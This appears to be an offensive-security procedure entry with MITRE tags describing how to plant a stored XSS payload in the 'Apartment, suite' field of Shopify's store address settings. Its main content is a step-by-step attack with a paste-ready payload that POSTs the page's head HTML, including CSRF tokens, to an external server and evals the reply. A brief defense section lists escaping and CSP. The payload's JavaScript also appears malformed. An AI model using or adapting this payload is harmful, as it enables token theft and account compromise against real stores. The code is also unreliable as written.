---
id: proc-inject-xss-store-address
tags:
  - xss
  - stored-xss
  - payload-injection
  - shopify
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.980Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Store-Address

## Summary

This procedure injects a stored XSS payload into the 'Apartment, suite, etc. (optional)' field in Shopify's store address settings, bypassing character limits and persisting malicious code for later execution.

## Description

The vulnerability stems from lack of HTML escaping when the store address is rendered in the Shopify Email App. The payload uses a delayed onerror handler on an invalid image src to exfiltrate document.head.innerHTML via postMessage and an XMLHttpRequest to an external server, enabling CSRF token theft.

## Requirements

1. Access to Shopify admin settings general page
2. Web browser developer tools for payload testing
3. External server (e.g., https://fbs.ninja) to receive exfiltrated data

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in address fields using HTML entity encoding
- Implement content security policy (CSP) to block inline scripts and external postMessages
- Log and alert on suspicious payloads in settings changes

## Objectives

1. Store executable JavaScript without immediate detection
2. Bypass 255-character limit with compact payload
3. Enable delayed exfiltration upon rendering

## Instructions

### Step 1: Locate the Vulnerable Field

**Context**: Identify the optional address input for payload placement.

Scroll to the Store address section and focus on 'Apartment, suite, etc. (optional)'.

> Expected: Field is editable and accepts HTML input.

### Step 2: Insert the Payload

**Context**: Craft and inject the malicious HTML to trigger on error.

Paste the following payload into the field:

```html
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText),2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/> 
```

> Explanation: The onerror handler sets a timeout, creates a function to POST head HTML to the external server, and uses postMessage for cross-context communication. Delays prevent immediate detection.

### Step 3: Save Settings

**Context**: Persist the payload in the backend.

Click Save to update the store address.

> Expected: Confirmation message; no validation errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[payload-injection]]
